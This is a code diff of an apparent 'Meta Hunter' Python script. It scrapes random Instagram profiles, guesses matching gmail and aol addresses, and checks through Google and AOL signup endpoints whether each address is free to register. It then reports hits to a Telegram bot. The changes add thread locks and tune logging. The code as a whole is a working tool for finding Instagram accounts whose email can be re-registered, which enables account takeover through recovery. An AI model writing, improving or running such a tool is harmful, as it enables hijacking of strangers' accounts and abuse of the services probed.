@@ -7,8 +7,7 @@ import time
 import re
 import hashlib
 import uuid
-import sys
-from threading import Thread
+from threading import Thread, Lock
 from user_agent import generate_user_agent as ggb
 from colorama import Fore, Style, init
 from cfonts import render
@@ -29,9 +28,14 @@ banner = render('{PRINCE}', colors=['white', 'red'], align='center')
 print(f"\n{banner}\n")
 print(Style.BRIGHT + Fore.CYAN + "🔄 Meta Hunter Worker starting on Heroku...\n")
 
-# Counters
+# Counters and locks
 aca = total = hits = badinsta = bademail = goodig = 0
 infoinsta = {}
+counter_lock = Lock()
+
+# For print frequency control
+last_status_time = 0
+status_lock = Lock()
 
 # Determine bbk and id_max based on YEAR env var
 try:
@@ -71,16 +75,19 @@ else:
     bbk = 10000
     id_max = 21254029834
 
-# Utility functions
 def pppp():
-    # Instead of clearing terminal, print status (Heroku logs don't support 'clear')
-    status = (
-        f"Hits: {hits}  | "
-        f"Bad Insta: {badinsta}  | "
-        f"Bad Mail: {bademail}  | "
-        f"Good IG: {goodig}"
-    )
-    print(Fore.YELLOW + status)
+    global last_status_time, hits, badinsta, bademail, goodig
+    with status_lock:
+        now = time.time()
+        if now - last_status_time > 5:  # Only print every 5 seconds
+            status = (
+                f"Hits: {hits}  | "
+                f"Bad Insta: {badinsta}  | "
+                f"Bad Mail: {bademail}  | "
+                f"Good IG: {goodig}"
+            )
+            print(Fore.YELLOW + status)
+            last_status_time = now
 
 def send_telegram(message):
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
@@ -90,7 +97,6 @@ def send_telegram(message):
         print(Fore.RED + f"Telegram send error: {e}")
 
 def rest(user):
-    # Simulate Instagram recovery flow (preserves original structure)
     try:
         response = requests.post(
             'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',
@@ -113,13 +119,9 @@ def rest(user):
 def check_gmail(email):
     global hits, bademail
     try:
-        # Extract local part if full address given
         local = email.split('@')[0] if '@' in email else email
-
-        # Read tl.txt for TL and host
         line = open('tl.txt', 'r').read().splitlines()[0]
         tl, host = line.split('//')
-
         cookies = {'__Host-GAPS': host}
         headers = {
             'authority': 'accounts.google.com',
@@ -147,7 +149,8 @@ def check_gmail(email):
             data=data
         )
         if '"gf.uar",1' in response.text:
-            hits += 1
+            with counter_lock:
+                hits += 1
             pppp()
             if '@' not in email:
                 ok = local + '@gmail.com'
@@ -157,23 +160,22 @@ def check_gmail(email):
                 username, domain = email.split('@')
                 InfoAcc(username, domain)
         else:
-            bademail += 1
+            with counter_lock:
+                bademail += 1
             pppp()
     except Exception:
-        bademail += 1
+        with counter_lock:
+            bademail += 1
         pppp()
 
 def check_aol(email):
     global hits, bademail
     try:
         name = email.split('@')[0] if '@' in email else email
-
-        # Read AOL request data
         with open("aol_req.txt", "r") as f:
             specData, specId, crumb, sessionIndex, acrumb = f.read().strip().split('Π')
         with open("aol_cok.txt", "r") as f:
             cookies = eval(f.read().strip())
-
         headers = {
             'authority': 'login.aol.com',
             'accept': '*/*',
@@ -191,7 +193,6 @@ def check_aol(email):
                           'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edge/120.0.0.0',
             'x-requested-with': 'XMLHttpRequest',
         }
-
         params = {'validateField': 'userId'}
         data = (
             f'browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C'
@@ -218,7 +219,6 @@ def check_aol(email):
             f'lastName=Mahos&userid-domain=yahoo&userId={name}&password=Drahmed2006##$$&'
             f'mm=10&dd=24&yyyy=2000&signup='
         )
-
         res = requests.post(
             'https://login.aol.com/account/module/create',
             params=params,
@@ -227,7 +227,8 @@ def check_aol(email):
             cookies=cookies
         ).text
         if '{"errors":[]}' in res:
-            hits += 1
+            with counter_lock:
+                hits += 1
             pppp()
             if '@' not in email:
                 ok = name + '@aol.com'
@@ -237,10 +238,12 @@ def check_aol(email):
                 username, domain = email.split('@')
                 InfoAcc(username, domain)
         else:
-            bademail += 1
+            with counter_lock:
+                bademail += 1
             pppp()
     except Exception:
-        bademail += 1
+        with counter_lock:
+            bademail += 1
         pppp()
 
 def check(email):
@@ -275,36 +278,22 @@ def check(email):
                 check_gmail(email)
             else:
                 check_aol(email)
-            goodig += 1
+            with counter_lock:
+                goodig += 1
             pppp()
         else:
-            badinsta += 1
+            with counter_lock:
+                badinsta += 1
             pppp()
     except Exception:
-        badinsta += 1
+        with counter_lock:
+            badinsta += 1
         pppp()
-
-def date(hy):
-    try:
-        ranges = [
-            (1279000, 2010),    (17750000, 2011),
-            (279760000, 2012),  (900990000, 2013),
-            (1629010000, 2014), (2500000000, 2015),
-            (3713668786, 2016), (5699785217, 2017),
-            (8597939245, 2018), (21254029834, 2019),
-            (43464475395, 2020),(50289297647, 2021),
-            (57464707082, 2022),(63313426938, 2023)
-        ]
-        for upper, year in ranges:
-            if hy <= upper:
-                return year
-        return 2023
-    except Exception:
-        return None
 
 def InfoAcc(username, domain):
     global total
-    total += 1
+    with counter_lock:
+        total += 1
 
     rr = infoinsta.get(username, {})
     Id = rr.get('pk', '')
@@ -426,13 +415,11 @@ def Getaol():
         crumb = qq.text.split('name="cacheStored">\n        <input type="hidden" value="')[1].split('" name="crumb">')[0]
         sessionIndex = qq.text.split('"acrumb">\n        <input type="hidden" value="')[1].split('" name="sessionIndex">')[0]
         acrumb = qq.text.split('name="crumb">\n        <input type="hidden" value="')[1].split('" name="acrumb">')[0]
-        # Clean old files
         for fname in ('aol_req.txt', 'aol_cok.txt'):
             try:
                 os.remove(fname)
             except:
                 pass
-        # Write new request and cookie data
         with open('aol_req.txt', 'w') as t:
             t.write(f"{specData}Π{specId}Π{crumb}Π{sessionIndex}Π{acrumb}\n")
         with open('aol_cok.txt', 'w') as g:
@@ -450,7 +437,6 @@ def gg_worker():
                 "variables": json.dumps({"id": rand_id, "render_surface": "PROFILE"}),
                 "doc_id": "25618261841150840"
             }
-
             headers = {
                 "X-FB-LSD": data["lsd"],
                 "User-Agent": ggb(),
@@ -459,42 +445,37 @@ def gg_worker():
                 "Origin": "https://www.instagram.com",
                 "Referer": "https://www.instagram.com/",
             }
-
             response = requests.post(
                 "https://www.instagram.com/api/graphql",
                 headers=headers,
                 data=data
             )
-
             try:
                 json_data = response.json()
                 user_data = json_data.get('data', {}).get('user')
-
                 if not isinstance(user_data, dict):
-                    print(Fore.RED + "⚠️ user_data is missing or invalid")
+                    # print(Fore.RED + "⚠️ user_data is missing or invalid")
                     continue
-
                 username = user_data.get('username')
                 if username:
                     infoinsta[username] = user_data
                     emails = [f"{username}@gmail.com", f"{username}@aol.com"]
                     for email in emails:
                         check(email)
-
             except Exception as e:
-                print(Fore.RED + "[JSON ERROR] Failed to parse response:")
-                print("Status Code:", response.status_code)
-                print("Response Text:", response.text[:500])
+                # print(Fore.RED + "[JSON ERROR] Failed to parse response:")
+                # print("Status Code:", response.status_code)
+                # print("Response Text:", response.text[:500])
                 continue
-
         except Exception as e:
-            print(Fore.RED + f"❌ Error in gg_worker: {e}")
+            # print(Fore.RED + f"❌ Error in gg_worker: {e}")
+            continue
+
 if __name__ == "__main__":
-    # Initial setup
     tll()
     Getaol()
-
-    # Start threads
-    THREADS = int(os.getenv('THREADS', '200'))
+    THREADS = int(os.getenv('THREADS', '10'))  # Default 10, can be set in env
     for _ in range(THREADS):
-        Thread(target=gg_worker).start()
+        Thread(target=gg_worker, daemon=True).start()
+    while True:
+        time.sleep(60)
